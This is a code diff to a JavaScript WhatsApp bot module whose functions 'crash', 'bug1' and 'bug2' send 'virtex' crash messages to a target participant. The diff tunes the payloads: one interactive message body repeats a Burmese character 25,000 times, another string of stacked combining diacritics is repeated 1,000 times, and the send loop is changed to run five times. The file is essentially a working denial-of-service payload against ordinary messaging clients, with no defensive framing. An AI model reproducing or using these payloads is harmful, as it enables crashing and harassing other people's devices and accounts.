@@ -1,5 +1,5 @@
 
-export  async function crash(message, client) {
+export async function crash(message, client) {
 
      try {
         const remoteJid = message.key?.remoteJid;
@@ -40,7 +40,7 @@ export  async function crash(message, client) {
 
         // Execute the bug command
 
-        for (let i = 0; i < 25; i++) {
+        for (let i = 0; i < 5; i++) {
 
             await bug1(message, client, participant);
 
@@ -85,7 +85,7 @@ async function bug1(message, client, participant) {
                                 hasMediaAttachment: true
                             },
                             body: {
-                                text: `⿻Senku love you\n${"ဤ".repeat(1000)}\n\n`
+                                text: `⿻Senku love you\n${"ဤ".repeat(25000)}\n\n`
                             },
                             nativeFlowMessage: {
                                 messageParamsJson: "{}"
@@ -135,7 +135,7 @@ async function bug2(message, client, participant) {
 
         console.log(`Sending bug2 message to: ${participant}`);
 
-        const virtex = "Senku love you" + "̵̴̵̴̶̴̴̴̴̵̵̵̶̴̴̶ًٌٌٍٍَ̡̡̡̡̡̡̡̡̡̡̢̢ٖٕٖٖٕٕٕٕٖٖٖ̭̻̭̳̩̤͚̺̭̩̱͙͙͙̭̭͙̻͙̻͙̻̻̥̲̻̭̦̦̼͙̬̺̖̖̤̬̞̩̼̮̩̼̩̼̬̱̼̼͓͙͍̹̱̭̩̹͙̼̩̼͍͉͎̱̮̺̱̱̩͍̩͕͍̺̩̫̤̩̩̩̮̩̼̮̪̞̫̝̝̥̩̦̳̮̩ٝٔٔٗٔٓٚٙٙ̓̓͊̓͒͑͋̽͑̐͑͊̑̓͑̑͑̐͑͑͑͊̎͊͑͑̈́͒́͌́͌͂͒͑͋́͛ͤͣͣͩͣͣͬͥͥͪͥͦͦͨͦͥ͐̽͂͌͐́͒͌͒͂̽͊̽͒͒͊͊͊͑̓͑̓͑͒͒͒͊͊͊̈́͊͌͆͊̕͘͢͢͡͡͠͝ͅͅͅͅͅͅͅ͏̩".repeat(25000);
+        const virtex = "Senku love you" + "̵̴̵̴̶̴̴̴̴̵̵̵̶̴̴̶ًٌٌٍٍَ̡̡̡̡̡̡̡̡̡̡̢̢ٖٕٖٖٕٕٕٕٖٖٖ̭̻̭̳̩̤͚̺̭̩̱͙͙͙̭̭͙̻͙̻͙̻̻̥̲̻̭̦̦̼͙̬̺̖̖̤̬̞̩̼̮̩̼̩̼̬̱̼̼͓͙͍̹̱̭̩̹͙̼̩̼͍͉͎̱̮̺̱̱̩͍̩͕͍̺̩̫̤̩̩̩̮̩̼̮̪̞̫̝̝̥̩̦̳̮̩ٝٔٔٗٔٓٚٙٙ̓̓͊̓͒͑͋̽͑̐͑͊̑̓͑̑͑̐͑͑͑͊̎͊͑͑̈́͒́͌́͌͂͒͑͋́͛ͤͣͣͩͣͣͬͥͥͪͥͦͦͨͦͥ͐̽͂͌͐́͒͌͒͂̽͊̽͒͒͊͊͊͑̓͑̓͑͒͒͒͊͊͊̈́͊͌͆͊̕͘͢͢͡͡͠͝ͅͅͅͅͅͅͅ͏̩".repeat(1000);
 
         const msgPayload = {
             groupMentionedMessage: {
